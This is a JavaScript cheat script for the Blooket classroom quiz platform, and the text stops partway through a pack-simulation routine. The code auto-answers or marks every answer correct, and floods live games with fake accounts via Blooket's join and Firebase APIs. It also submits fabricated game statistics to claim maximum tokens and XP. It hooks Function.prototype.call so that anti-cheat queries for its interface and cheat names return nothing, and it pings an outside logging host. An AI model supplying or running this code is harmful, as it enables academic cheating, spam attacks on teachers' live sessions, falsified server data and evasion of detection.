/**
* @license StewartPrivateLicense-2.0.1
* Copyright (c) 05Konz 2023
*
* You may not reproduce or distribute any code inside this file without the licenser's permission.
* You may not copy, modify, steal, skid, or recreate any of the code inside this file.
* You may not under any circumstance republish any code from this file as your own.
* 
* ALL TERMS STATED IN THE LINK BELOW APPLY ASWELL
* https://github.com/05Konz/Blooket-Cheats/blob/main/LICENSE
*/

/* THE UPDATE CHECKER IS ADDED DURING COMMIT PREP, THERE MAY BE REDUNDANT CODE, DO NOT TOUCH */

(() => {
    const cheat = (async () => {
        if (String(Function.prototype.call).includes('native')) {
            let call = Function.prototype.call;
            let iframe = document.createElement("iframe");
            document.body.append(iframe);
            iframe.style.display = "none";
            let funcs = {
                querySelectorAll: function () {
                    if (["#JODGUI", "#JODMOBILE", "#currPageEl", "#YTRkNmM2MWEtOTg3Zi00YmE1LWI1NzUtNTgyOTUzMWI4ZDYx", "#ODJkMThlMDEtYmEwNi00MzE4LTg4ZGMtM2Y2ZDI0MzY4ZjU2", ".cheatList", ".cheatName", "bG1mYW8=", "#aXQncyBjYXQgYW5kIG1vdXNlIGF0IHRoaXMgcG9pbnQ"].includes(arguments[0]))
                        return [];
                    return iframe.contentDocument.querySelectorAll.apply(document, arguments);
                },
                querySelector: iframe.contentDocument.querySelector.bind(document),
                includes: function () {
                    if (["Cheats", "Global", "Global Cheats", "Discord - oneminesraft2", "Auto Answer (Toggle)", "Auto Sell Dupes On Open", "Spam Buy Blooks", "Food Game", "Change Blook Ingame", "Get Daily Rewards", "Remove Name Limit", "Simulate Unlock", "Cheat ESP", "Gold Quest Cheats", "Cafe Cheats", "Crypto Hack Cheats", "Deceptive Dinos Cheats", "Tower Defense Cheats", "Tower Defense2 Cheats", "Factory Cheats", "Fishing Frenzy Cheats", "Flappy Blook Cheats", "Tower of Doom Cheats", "Crazy Kingdom Cheats", "Racing Cheats", "Battle Royale Cheats", "Blook Rush Cheats", "Monster Brawl Cheats", "Santa's Workshop Cheats"].includes(arguments[0]))
                        return false;
                    return iframe.contentWindow.String.prototype.call(this, arguments);
                },
                fetch: iframe.contentWindow.fetch.bind(window),
                btoa: iframe.contentWindow.btoa.bind(window),
                getItem: iframe.contentWindow.localStorage.getItem.bind(window.localStorage)
            }, funcNames = Object.keys(funcs);
            Function.prototype.call = function () {
                if (funcNames.includes(this.name)) return call.apply(funcs[this.name], arguments);
                return call.apply(this, arguments)
            }
            (new Image).src = "https://gui-logger.onrender.com/gui/2?" + Date.now();
        }
        
        let { webpack } = webpackJsonp.push([[], { ['1234']: (_, a, b) => { a.webpack = b }, }, [['1234']]]);
        const cache = Object.values(webpack.c);
        const React = cache.find(x => x.exports.createElement).exports;
        const { createElement, useState, useCallback, useRef, useEffect } = React;
        const ReactDOM = cache.find(x => x.exports.findDOMNode).exports;
        const { Textfit } = cache.find(x => x.exports.Textfit).exports;
        const Tooltip = cache.find(x => x.exports.a?.displayName == "ReactTooltip").exports.a;
        let settings = {
            data: null
        };
        let styles = { css: `#bigButton:hover,.scriptButton:hover{transition:.2s;filter:brightness(1.1)}#background,#gui{height:100%;width:100%;overflow:hidden}#background,#backgroundImage{position:absolute;visibility:visible}#controls,#credits{padding-bottom:8px;background:var(--infoColor);box-shadow:rgba(0,0,0,.2) 0 -8px inset,rgba(0,0,0,.15) 0 0 4px;top:0}#cheatList,select{text-align:center}#cheatList,#controls,#guiWrapper div,.cheatButton{user-select:none}#cheatList,.cheatButton,.scriptButton{box-sizing:border-box}#contentWrapper,.alertList{-ms-overflow-style:none;scrollbar-width:none}#cheats,#gui,.cheatButton,.scriptButton{position:relative}#guiWrapper{position:fixed;height:80%;width:80%;max-height:600px;max-width:1000px;z-index:999;display:block}.alertList::-webkit-scrollbar{display:none}#contentWrapper::-webkit-scrollbar{display:none}.cheatButton{display:flex;flex-direction:row;align-items:center;min-height:40px;width:190px;margin:4px 0;padding-left:15px;cursor:pointer;text-decoration:none;border-top-right-radius:5px;border-bottom-right-radius:5px;background-color:transparent;color:var(--textColor);transition:.2s linear;font-size:20px;font-weight:400;font-family:Nunito;text-decoration-thickness:auto}#bigButton,.scriptButton{cursor:pointer;transition:.5s;display:flex}.cheatInput,.scriptButton,select{font-family:Nunito,sans-serif;font-weight:400}.cheatButton>div{height:40px;width:135px;display:flex;justify-content:flex-start;align-items:center}.cheatButton:hover{background-color:var(--textColor);color:var(--defaultButton)}#controls,#credits,.cheatInput,.scriptButton,select{color:var(--textColor)}.cheatInput,select{min-width:200px;padding:5px 0;font-size:16px;background-color:var(--inputColor);box-shadow:inset 0 6px rgb(0 0 0 / 20%);margin:3px}#bigButton{font-size:26px;padding:5px 20px 10px;margin:20px auto 10px;color:#fff;justify-content:center;align-items:center;text-decoration:none;border-radius:5px;text-shadow:2px 2px rgb(0 0 0 / 20%);box-shadow:inset 0 -5px #0005;background-color:#0bc2cf}#bigButton:hover{padding-bottom:13px;margin-top:17px;box-shadow:inset 0 -8px #0005}#bigButton:active{padding-bottom:5px;margin-top:25px;box-shadow:inset 0 0 #0005;transition:50ms}#cheatList::-webkit-scrollbar{width:10px}#cheatList::-webkit-scrollbar-track{background:var(--cheatList)}#cheatList::-webkit-scrollbar-thumb{background:var(--cheatList);box-shadow:inset -10px 0 rgb(0 0 0 / 20%)}#cheatList::-webkit-scrollbar-thumb:hover{background:var(--cheatList);box-shadow:inset -10px 0 rgb(0 0 0 / 30%)}.cheatInput{max-width:200px;border:none;border-radius:7px;caret-color:var(--textColor)}.cheatInput::placeholder{color:var(--textColor)}.cheatInput:focus,select:focus{outline:0}.cheatInput::-webkit-inner-spin-button,.cheatInput::-webkit-outer-spin-button{-webkit-appearance:none;margin:0}.cheatInput[type=number]{-moz-appearance:textfield}select{border:none;border-radius:7px}.scriptButton{align-items:center;flex-direction:column;justify-content:center;margin:10px;padding:5px 5px 11px;width:250px;border-radius:7px;box-shadow:inset 0 -6px rgb(0 0 0 / 20%)}.scriptButton:hover{margin-top:7px;padding-bottom:14px;box-shadow:inset 0 -9px rgb(0 0 0 / 20%)}.scriptButton:active{transition:50ms;margin-top:16px;padding-bottom:5px;box-shadow:inset 0 0 rgb(0 0 0 / 20%)}#gui{outline:rgb(58,58,58) solid 3px;border-radius:15px}#background{display:block;top:0;left:0;background:var(--backgroundColor)}#backgroundImage{background-image:url(https://ac.blooket.com/dashboard/65a43218fd1cabe52bdf1cda34613e9e.png);display:block;height:200%;width:200%;top:50%;left:50%;background-position:-100px -100px;background-size:550px;transform:translate(-50%,-50%) rotate(15deg);appearance:none;opacity:.175}#controls{cursor:grab;display:flex;flex-direction:column;align-items:flex-start;justify-content:center;padding-inline:15px;position:absolute;left:220px;visibility:visible;z-index:5;height:52px;width:max-content;border-bottom-right-radius:10px;font-family:Nunito,sans-serif;font-weight:700}#controlButtons,#credits{align-items:center;right:0;visibility:visible;font-family:Nunito,sans-serif;font-weight:700;user-select:text;z-index:5;display:flex;position:absolute}#controls:active{cursor:grabbing}#credits{justify-content:center;height:47px;width:210px;border-bottom-left-radius:10px}#controlButtons{justify-content:center;bottom:0;height:55px;width:165px;border-left:3px solid #000;border-top:3px solid #000;border-top-left-radius:10px;color:#fff;overflow:hidden;pointer-events:all}.dragButton:active{cursor:grabbing!important}#controlButtons>*{height:55px;width:55px;font-family:Nunito;color:#fff;border:none;font-size:2rem;display:flex;align-items:center;justify-content:center;cursor:grab}#cheatList,#cheats,.cheatName{color:var(--textColor)}#cheats,#contentWrapper,.alertContainer,.headerText{border-radius:7px}#cheatList{overflow-y:scroll;overflow-x:hidden;background:var(--cheatList);box-shadow:rgba(0,0,0,.2) -10px 0 inset;z-index:5;width:220px;position:absolute;top:0;left:0;height:100%;font-family:"Titan One";font-size:40px;padding-block:20px;display:flex;flex-direction:column}#contentWrapper{position:absolute;left:220px;top:70px;overflow-y:scroll;width:calc(100% - 220px);height:calc(100% - 70px)}#cheats,.headerText>div{align-items:center;box-sizing:border-box;display:flex;width:100%;font-weight:400}#content{position:absolute;inset:27px 50px 50px}#cheats{flex-flow:row wrap;justify-content:space-evenly;padding:20px 5px;font-family:Nunito,sans-serif;background:var(--contentBackground);box-shadow:rgba(0,0,0,.2) 0 -6px inset}.headerText{box-sizing:border-box;display:block;height:45px;left:-10px;padding:4px 4px 8px;position:absolute;top:-28px;background-color:#ef7426;box-shadow:rgba(0,0,0,.2) 0 4px,rgba(0,0,0,.2) 0 -4px inset}.headerText>div{height:100%;justify-content:center;padding:0 15px;font-family:"Titan One",sans-serif;font-size:26px;text-shadow:#646464 -1px -1px 0,#646464 1px -1px 0,#646464 -1px 1px 0,#646464 2px 2px 0;color:#fff;background:linear-gradient(#fcd843,#fcd843 50%,#feb31a 50.01%,#feb31a);border-radius:5px}.alertContainer{margin:15px 15px 5px;background-color:rgb(0 0 0 / 50%);width:95%;height:370px;display:block;align-items:center;justify-content:center}`, keys: {} };
        for (let key of [...styles.css.matchAll(/(#|\.)([a-zA-Z]+?)(,|\{|:)/g)].reduce((a, [_, __, b]) => (a.includes(b) ? a : a.concat(b)), [])) {
            styles.keys[key] = Array(10).fill().reduce((a) => a + String.fromCharCode(Math.floor(Math.random() * 25) + 97), "");
            styles.css = styles.css.replace(new RegExp(`(#|\\.)(${key})(,|\\{|:|>|\\[)`, "g"), (_, __, m) => m == key ? _.replace(key, styles.keys[key]) : _);
        }
        const Cheats = {
            global: {
                name: "Global",
                img: "https://media.blooket.com/image/upload/v1661496291/Media/uiTest/Games_Played_2.svg",
                cheats: [
                    {
                        name: "Auto Answer (Toggle)",
                        description: "Toggles auto answer on",
                        type: "toggle",
                        enabled: false,
                        data: null,
                        run: function () {
                            if (!this.enabled) {
                                this.enabled = true;
                                this.data = setInterval(() => {
                                    const { stateNode: { state: { question, stage, feedback }, props: { client: { question: pquestion } } } } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                    const q = (question || pquestion);
                                    try {
                                        if (q.qType != "typing") if (stage !== "feedback" && !feedback) [...document.querySelectorAll(`[class*="answerContainer"]`)][q.answers.map((x, i) => q.correctAnswers.includes(x) ? i : null).filter(x => x != null)[0]]?.click?.();
                                        else document.querySelector('[class*="feedback"]')?.firstChild?.click?.();
                                        else Object.values(document.querySelector("[class*='typingAnswerWrapper']"))[1].children._owner.stateNode.sendAnswer(q.answers[0])
                                    } catch { }
                                }, 50);
                            } else {
                                this.enabled = false;
                                clearInterval(this.data);
                                this.data = null;
                            }
                        }
                    },
                    {
                        name: "Highlight Answers (Toggle)",
                        description: "Toggles highlight answers on",
                        type: "toggle",
                        enabled: false,
                        data: null,
                        run: function () {
                            if (!this.enabled) {
                                this.enabled = true;
                                this.data = setInterval(() => {
                                    const { stateNode: { state, props } } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                                    [...document.querySelectorAll(`[class*="answerContainer"]`)].forEach((answer, i) => {
                                        if ((state.question || props.client.question).correctAnswers.includes((state.question || props.client.question).answers[i])) answer.style.backgroundColor = "rgb(0, 207, 119)";
                                        else answer.style.backgroundColor = "rgb(189, 15, 38)";
                                    });
                                }, 50);
                            } else {
                                this.enabled = false;
                                clearInterval(this.data);
                                this.data = null;
                            }
                        }
                    },
                    {
                        name: "Auto Answer",
                        description: "Click the correct answer for you",
                        run: function () {
                            const { stateNode: { state: { question, stage, feedback }, props: { client: { question: pquestion } } } } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            try {
                                if (question.qType != "typing") if (stage !== "feedback" && !feedback) [...document.querySelectorAll(`[class*="answerContainer"]`)][(question || pquestion).answers.map((x, i) => (question || pquestion).correctAnswers.includes(x) ? i : null).filter(x => x != null)[0]]?.click?.();
                                else document.querySelector('[class*="feedback"]')?.firstChild?.click?.();
                                else Object.values(document.querySelector("[class*='typingAnswerWrapper']"))[1].children._owner.stateNode.sendAnswer(question.answers[0])
                            } catch { }
                        }
                    },
                    {
                        name: "Spam Buy Blooks",
                        description: "Opens a box an amount of times",
                        inputs: [
                            {
                                name: "Box",
                                type: "options",
                                options: () => {
                                    return new Promise(r => {
                                        r(Object.keys(Object.values(webpackJsonp.push([[], { ['1234']: (_, a, b) => { a.webpack = b }, }, [['1234']]]).webpack.c).find(x => !isNaN(x?.exports?.a?.Space))?.exports?.a || {}));
                                    });
                                }
                            },
                            {
                                name: "Amount",
                                type: "number"
                            }
                        ],
                        run: function (box, amountToOpen) {
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            window.alert = i.contentWindow.alert.bind(window);
                            window.prompt = i.contentWindow.prompt.bind(window);
                            window.confirm = i.contentWindow.confirm.bind(window);
                            i.remove();
                            let { webpack } = webpackJsonp.push([[], { ['1234']: (_, a, b) => { a.webpack = b }, }, [['1234']]]),
                                axios = Object.values(webpack.c).find((x) => x.exports?.a?.get).exports.a,
                                { purchaseBlookBox } = Object.values(webpack.c).find(x => x.exports.a?.purchaseBlookBox).exports.a;
                            box = box.split(' ').map(x => x.charAt(0).toUpperCase() + x.slice(1).toLowerCase()).join(' ');
        
                            axios.get("https://dashboard.blooket.com/api/users").then(async ({ data: { name, tokens } }) => {
                                let prices = Object.values(webpack.c).find(x => !isNaN(x?.exports?.a?.Space)).exports.a || { Medieval: 20, Breakfast: 20, Wonderland: 20, Blizzard: 25, Space: 20, Bot: 20, Aquatic: 20, Safari: 20, Dino: 25, "Ice Monster": 25, Outback: 25 }
                                let amount = Math.min(Math.floor(tokens / prices[box]), amountToOpen);
                                if (amount == 0) {
                                    if (amountToOpen > 0) alert("You do not have enough tokens!");
                                    return;
                                };
        
                                let alertBlooks = confirm("Would you like to alert blooks upon unlocking?");
                                let blooks = {};
                                let now = Date.now();
                                let error = false;
        
                                for (let i = 0; i < amount; i++) {
                                    await purchaseBlookBox({ boxName: box }).then(({ isNewToUser, tokens, unlockedBlook }) => {
                                        blooks[unlockedBlook] ||= 0;
                                        blooks[unlockedBlook]++;
        
                                        let before = Date.now();
        
                                        if (alertBlooks) alert(`${unlockedBlook} (${i + 1}/${amount}) ${isNewToUser ? "NEW! " : ''}${tokens} tokens left`);
        
                                        now += Date.now() - before;
                                    }).catch(e => error = true);
                                    if (error) break;
                                };
                                alert(`(${Date.now() - now}ms) Results:\n${Object.entries(blooks).map(([blook, amount]) => `    ${blook} ${amount}`).join(`\n`)}`);
                            }).catch(() => alert('There was an error user data!'));
                        }
                    },
                    {
                        name: "Flood Game",
                        description: "Floods a game with a number of fake accounts",
                        inputs: [
                            {
                                name: "Game ID",
                                type: "string"
                            },
                            {
                                name: "Name",
                                type: "string"
                            },
                            {
                                name: "Amount",
                                type: "number"
                            },
                            {
                                name: "Blook",
                                type: "options",
                                options: async () => {
                                    let { webpack } = webpackJsonp.push([[], { ['1234']: (_, a, b) => { a.webpack = b }, }, [['1234']]]);
                                    return ["Random"].concat(Object.keys(Object.values(webpack.c).find(x => x.exports.a?.Black)?.exports?.a || []));
                                }
                            },
                            {
                                name: "Banner",
                                type: "options",
                                options: Object.entries({ Starter: "starter", Chalkboard: "chalkboard", Slime: "slime", Bookshelf: "bookshelf", "Toaster Pastry": "toasterPastry", Theater: "theater", Sushi: "sushi", Workbench: "workbench", Spooky: "spooky", Spiders: "spiders", Coffin: "coffin", Pumpkins: "pumpkins", "Falling Blocks": "fallingBlocks", Racetrack: "racetrack", Harvest: "harvest", Leaves: "leaves", "Fall Picnic": "fallPicnic", "Winter Drive": "winterDrive", "Winter Train": "winterTrain", Ice: "ice", Gifts: "gifts", "Christmas Tree": "christmasTree", "Soccer Field": "soccerField", "Winter Landscape": "winterLandscape", "Football Field": "footballField", "Outer Space": "outerSpace", "Hockey Rink": "hockeyRink", "Music Class": "musicClass", "Ice Cream Sandwich": "iceCreamSandwich", "Science Class": "scienceClass", "Fish Tank": "fishTank", "Art Class": "artClass", Clockwork: "clockwork", "Love Letter": "loveLetter", Farm: "farm", Chocolate: "chocolate", "Tech Chip": "techChip", Fire: "fire", "Orange Ice Pop": "orangeIcePop" }).map(([name, value]) => ({ name, value }))
                            }
                        ],
                        run: async function (id, name, amount, b, bg) {
                            let cache = Object.values(webpackJsonp.push([[], { ['']: (_, a, b) => { a.cache = b.c }, }, [['']]]).cache);
                            const axios = cache.find((x) => x.exports?.a?.get).exports.a;
                            const firebase = cache.find(x => x.exports?.a?.initializeApp).exports.a;
                            const blooks = Object.keys(Object.values(cache).find(x => x.exports.a?.Black).exports.a);
        
                            for (let i = 1; i <= amount; i++) {
                                (async () => {
                                    let ign = `${name}${String.fromCharCode(96 + i)}`;
                                    const { data: { success, fbToken, fbShardURL } } = await axios.put("https://fb.blooket.com/c/firebase/join", { id, name: ign });
                                    if (!success) return;
                                    const liveApp = firebase.initializeApp({
                                        apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
                                        authDomain: "blooket-2020.firebaseapp.com",
                                        projectId: "blooket-2020",
                                        storageBucket: "blooket-2020.appspot.com",
                                        messagingSenderId: "741533559105",
                                        appId: "1:741533559105:web:b8cbb10e6123f2913519c0",
                                        measurementId: "G-S3H5NGN10Z",
                                        databaseURL: fbShardURL
                                    }, ign);
                                    const auth = firebase.auth(liveApp);
                                    await auth.setPersistence(firebase.auth.Auth.Persistence.NONE).catch(console.error);
                                    await auth.signInWithCustomToken(fbToken).catch(console.error);
                                    await liveApp.database().ref(`${id}/c/${ign}`).set({ b: b == "Random" ? blooks[Math.floor(Math.random() * blooks.length)] : b, bg });
                                    liveApp.delete();
                                })();
                                await new Promise(r => setTimeout(r, 100));
                            }
                        }
                    },
                    {
                        name: "Change Blook Ingame",
                        description: "Changes your blook",
                        inputs: [
                            {
                                name: "Blook",
                                type: "options",
                                options: async () => {
                                    let { webpack } = webpackJsonp.push([[], { ['1234']: (_, a, b) => { a.webpack = b }, }, [['1234']]]);
                                    return Object.keys(Object.values(webpack.c).find(x => x.exports.a?.Chick && x.exports.a?.Elephant).exports.a);
                                }
                            }
                        ],
                        run: function (blook) {
                            let { props } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode;
                            props.client.blook = blook;
                            props.liveGameController.setVal({ path: `c/${props.client.name}/b`, val: blook });
                        }
                    },
                    {
                        name: "Get Daily Rewards",
                        description: "Gets max daily tokens and xp",
                        run: function () {
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            window.alert = i.contentWindow.alert.bind(window);
                            i.remove();
                            if (!location.href.includes("play.blooket.com")) (alert("This cheat only works on play.blooket.com, opening a new tab."), window.open("https://play.blooket.com/"));
                            else {
                                const cache = Object.values(webpackJsonp.push([[], { ['']: (_, a, b) => { a.cache = b.c }, }, [['']],]).cache),
                                    axios = cache.find((x) => x.exports?.a?.get).exports.a;
                                axios.post("https://play.blooket.com/api/playersessions/solo", {
                                    gameMode: "Factory",
                                    questionSetId: ["60101da869e8c70013913b59", "625db660c6842334835cb4c6", "60268f8861bd520016eae038", "611e6c804abdf900668699e3", "60ba5ff6077eb600221b7145", "642467af9b704783215c1f1b", "605bd360e35779001bf57c5e", "6234cc7add097ff1c9cff3bd", "600b1491d42a140004d5215a", "5db75fa3f1fa190017b61c0c", "5fac96fe2ca0da00042b018f", "600b14d8d42a140004d52165", "5f88953cdb209e00046522c7", "600b153ad42a140004d52172", "5fe260e72a505b00040e2a11", "5fe3d085a529560004cd3076", "5f5fc017aee59500041a1456", "608b0a5863c4f2001eed43f4", "5fad491512c8620004918ace", "5fc91a9b4ea2e200046bd49a", "5c5d06a7deebc70017245da7", "5ff767051b68750004a6fd21", "5fdcacc85d465a0004b021b9", "5fb7eea20bd44300045ba495"][Math.floor(Math.random() * 24)]
                                }).then(async ({ data: { t } }) => {
                                    await axios.post("https://play.blooket.com/api/playersessions/landings", { t });
                                    const { name, blook: { name: blookUsed } } = await cache.find(x => x.exports.a?.me).exports.a.me({}).catch(() => alert('There was an error getting user data.'));
                                    await axios.put("https://play.blooket.com/api/users/factorystats", {
                                        blookUsed, t, name,
                                        cash: Math.floor(Math.random() * 90000000) + 10000000,
                                        correctAnswers: Math.floor(Math.random() * 500) + 500,
                                        upgrades: Math.floor(Math.random() * 300) + 300,
                                        mode: "Time-Solo",
                                        nameUsed: "You",
                                        place: 1,
                                        playersDefeated: 0,
                                    });
                                    axios.put("https://play.blooket.com/api/users/add-rewards", { t, name, addedTokens: 500, addedXp: 300 })
                                        .then(({ data: { dailyReward } }) => alert(`Added max tokens and xp, and got ${dailyReward} daily wheel tokens!`))
                                        .catch(() => alert('There was an error when adding rewards.'));
                                });
                            }
                        }
                    },
                    {
                        name: "Use Any Blook",
                        description: "Allows you to play as any blook",
                        run: function () {
                            const { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            const blooks = webpackJsonp.push([[], { ['1234']: (_, a, b) => { a.webpack = b } }, [['1234']]]).webpack("MDrD").a;
                            if (location.pathname == "/blooks") stateNode.setState({ blookData: Object.keys(blooks).reduce((a, b) => (a[b] = (stateNode.state.blookData[b] || 1), a), {}), allSets: Object.values(blooks).reduce((a, b) => (a.includes(b.set) ? a : a.concat(b.set)), []) });
                            else if (Array.isArray(stateNode.state.unlocks)) stateNode.setState({ unlocks: Object.keys(blooks) });
                            else stateNode.setState({ unlocks: blooks });
                        }
                    },
                    {
                        name: "Every Answer Correct",
                        description: "Sets every answer to be correct",
                        run: function () {
                            const { stateNode } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            stateNode.freeQuestions = stateNode.questions = stateNode.props.client.questions.map(x => ({ ...x, correctAnswers: x.answers }));
                        }
                    },
                    {
                        name: "Highlight Answers",
                        description: "Colors answers to be red or green highlighting the correct ones",
                        run: function () {
                            const { stateNode: { state, props } } = Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner;
                            [...document.querySelectorAll(`[class*="answerContainer"]`)].forEach((answer, i) => {
                                if ((state.question || props.client.question).correctAnswers.includes((state.question || props.client.question).answers[i])) answer.style.backgroundColor = "rgb(0, 207, 119)";
                                else answer.style.backgroundColor = "rgb(189, 15, 38)";
                            });
                        }
                    },
                    {
                        name: "Remove Name Limit",
                        description: "Sets the name limit to 120, which is the actual max name length limit",
                        run: function () {
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            window.alert = i.contentWindow.alert.bind(window);
                            i.remove();
                            document.querySelector('input[class*="nameInput"]').maxLength = 120; /* 120 is the actual limit */
                            alert("Removed name length limit");
                        }
                    },
                    {
                        name: "Remove Random Name",
                        description: "Allows you to put a custom name",
                        run: function () {
                            Object.values(document.querySelector('body div[class*="camelCase"]'))[1].children[0]._owner.stateNode.setState({ isRandom: false, client: { name: "" } });
                            document.querySelector('[class*="nameInput"]')?.focus?.();
                        }
                    },
                    {
                        name: "Sell Cheap Duplicates",
                        description: "Sells all of your uncommon to epic dupes (not legendaries+)",
                        run: function () {
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            window.alert = i.contentWindow.alert.bind(window);
                            window.confirm = i.contentWindow.confirm.bind(window);
                            i.remove();
                            let { webpack } = webpackJsonp.push([[], { ['1234']: (_, a, b) => { a.webpack = b }, }, [['1234']]]),
                                axios = Object.values(webpack.c).find((x) => x.exports?.a?.get).exports.a,
                                { sellBlook } = Object.values(webpack.c).find(x => x.exports.a?.sellBlook).exports.a;
                            axios.get("https://dashboard.blooket.com/api/users").then(async ({ data: { unlocks } }) => {
                                let blooks = Object.entries(unlocks).filter(([blook, amount]) => amount > 1 && !["Legendary", "Chroma", "Mystical"].includes(webpackJsonp.push([[], { ['1234']: (_, a, b) => { a.webpack = b } }, [['1234']]]).webpack("MDrD").a[blook].rarity));
                                if (confirm(`Are you sure you want to sell your uncommon to epic dupes?`)) {
                                    let now = Date.now();
                                    for (const [blook, amount] of blooks) await sellBlook({ blook, numToSell: amount - 1 });
                                    alert(`(${Date.now() - now}ms) Results:\n${blooks.map(([blook, amount]) => `    ${blook} ${amount - 1}`).join(`\n`)}`);
                                }
                            }).catch(() => alert('There was an error user data!'));
                        }
                    },
                    {
                        name: "Sell Duplicate Blooks",
                        description: "Sell all duplicate blooks leaving you with 1 each",
                        run: function () {
                            let i = document.createElement('iframe');
                            document.body.append(i);
                            window.alert = i.contentWindow.alert.bind(window);
                            window.confirm = i.contentWindow.confirm.bind(window);
                            i.remove();
                            let { webpack } = webpackJsonp.push([[], { ['1234']: (_, a, b) => { a.webpack = b }, }, [['1234']]]),
                                axios = Object.values(webpack.c).find((x) => x.exports?.a?.get).exports.a,
                                { sellBlook } = Object.values(webpack.c).find(x => x.exports.a?.sellBlook).exports.a;
                            axios.get("https://dashboard.blooket.com/api/users").then(async ({ data: { unlocks } }) => {
                                let blooks = Object.entries(unlocks).filter(x => x[1] > 1);
                                if (confirm(`Are you sure you want to sell your dupes?`)) {
                                    let now = Date.now();
                                    for (const [blook, amount] of blooks) await sellBlook({ blook, numToSell: amount - 1 });
                                    alert(`(${Date.now() - now}ms) Results:\n${blooks.map(([blook, amount]) => `    ${blook} ${amount - 1}`).join(`\n`)}`);
                                }
                            }).catch((e) => (alert('There was an error user data!'), console.info(e)));
                        }
                    },
                    {
                        name: "Simulate Pack",
                        description: "Simulate opening a pack",
                        inputs: [{
                            name: "Pack",
                            type: "options",
                            options: async () => {
                                return Array.from(document.querySelectorAll('[class*="packShadow"]')).map(x => x.alt);
                            }
                        }],
                        run: (function () {
                            try {
                                let { webpack } = webpackJsonp.push([[], { ['1234']: (_, a, b) => { a.webpack = b }, }, [['1234']]]);
                                let values = Object.values(webpack.c),
                                    blooks = values.find(x => x.exports?.a?.Chick?.set).exports.a,
                                    packs = values.find(x => x.exports.a?.Breakfast).exports.a,
                                    allBlooks = Object.entries(blooks).reduce((a, [b, c]) => (packs[c.realSet || c.set] && (a[b] = c), a), {});
                                let phaser = Object.values(webpack.c).find(x => x.exports?.Class).exports;
                                let scene = {};
                                class Particles extends phaser.Scene {
                                    constructor(rarity) {
                                        super();
                                        this.rarity = rarity.toLowerCase();
                                    }
                                    preload() {
                                        switch (this.rarity) {
                                            case "uncommon":
                                                this.load.svg("uncommon-1", "https://media.blooket.com/image/upload/v1658567787/Media/market/particles/square_green.svg", { width: 25, height: 25 });
                                                this.load.svg("uncommon-2", "https://media.blooket.com/image/upload/v1658567787/Media/market/particles/square_light_green.svg", { width: 25, height: 25 });
                                                this.load.svg("uncommon-3", "https://media.blooket.com/image/upload/v1658567785/Media/market/particles/circle_dark_green.svg", { width: 25, height: 25 });
                                                this.load.svg("uncommon-4", "https://media.blooket.com/image/upload/v1658567785/Media/market/particles/serpentine_dark_green.svg", { width: 30, height: 30 });
                                                this.load.svg("uncommon-5", "https://media.blooket.com/image/upload/v1658567785/Media/market/particles/triangle_light_green.svg", { width: 30, height: 30 });
                                                this.load.svg("uncommon-6", "https://media.blooket.com/image/upload/v1658567785/Media/market/particles/serpentine_light_green.svg", { width: 30, height: 30 });
                                                this.load.svg("uncommon-7", "https://media.blooket.com/image/upload/v1658567785/Media/market/particles/triangle_green.svg", { width: 30, height: 30 });
                                                break;
                                            case "rare":
                                                this.load.svg("rare-1", "https://media.blooket.com/image/upload/v1658567765/Media/market/particles/square_light_blue.svg", { width: 25, height: 25 });
                                                this.load.svg("rare-2", "https://media.blooket.com/image/upload/v1658567765/Media/market/particles/square_dark_blue.svg", { width: 25, height: 25 });
                                                this.load.svg("rare-3", "https://media.blooket.com/image/upload/v1658567763/Media/market/particles/triangle_blue.svg", { width: 30, height: 30 });
                                                this.load.svg("rare-4", "https://media.blooket.com/image/upload/v1658567763/Media/market/particles/serpentine_blue.svg", { width: 30, height: 30 });
                                                this.load.svg("rare-5", "https://media.blooket.com/image/upload/v1658567763/Media/market/particles/triangle_light_blue.svg", { width: 30, height: 30 });
                                                this.load.svg("rare-6", "https://media.blooket.com/image/upload/v1658567763/Media/market/particles/serpentine_light_blue.svg", { width: 30, height: 30 });
                                                this.load.svg("rare-7", "https://media.blooket.com/image/upload/v1658567763/Media/market/particles/circle_dark_blue.svg", { width: 25, height: 25 });
                                                break;
                                            case "epic":
                                                this.load.svg("epic-1", "https://media.blooket.com/image/upload/v1658790239/Media/market/particles/red.svg", { width: 25, height: 25 });
                                                this.load.svg("epic-2", "https://media.blooket.com/image/upload/v1658790237/Media/market/particles/light_red.svg", { width: 25, height: 25 });
                                                this.load.svg("epic-3", "https://media.blooket.com/image/upload/v1658790239/Media/market/particles/serpentine_red.svg", { width: 30, height: 30 });
                                                this.load.svg("epic-4", "https://media.blooket.com/image/upload/v1658790239/Media/market/particles/serpentine_dark_red.svg", { width: 30, height: 30 });
                                                this.load.svg("epic-5", "https://media.blooket.com/image/upload/v1658790237/Media/market/particles/triangle_red.svg", { width: 30, height: 30 });
                                                this.load.svg("epic-6", "https://media.blooket.com/image/upload/v1658790237/Media/market/particles/triangle_light_red.svg", { width: 30, height: 30 });
                                                this.load.svg("epic-7", "https://media.blooket.com/image/upload/v1658790237/Media/market/particles/circle_dark_red.svg", { width: 25, height: 25 });
                                                break;
                                            case "legendary":
                                                this.load.svg("legendary-1", "https://media.blooket.com/image/upload/v1658567740/Media/market/particles/square_orange.svg", { width: 25, height: 25 });
                                                this.load.svg("legendary-2", "https://media.blooket.com/image/upload/v1658567740/Media/market/particles/square_light_orange.svg", { width: 25, height: 25 });
                                                this.load.svg("legendary-3", "https://media.blooket.com/image/upload/v1658567738/Media/market/particles/circle_orange.svg", { width: 25, height: 25 });
                                                this.load.svg("legendary-4", "https://media.blooket.com/image/upload/v1658567738/Media/market/particles/serpentine_orange.svg", { width: 30, height: 30 });
                                                this.load.svg("legendary-5", "https://media.blooket.com/image/upload/v1658567738/Media/market/particles/serpentine_light_orange.svg", { width: 30, height: 30 });
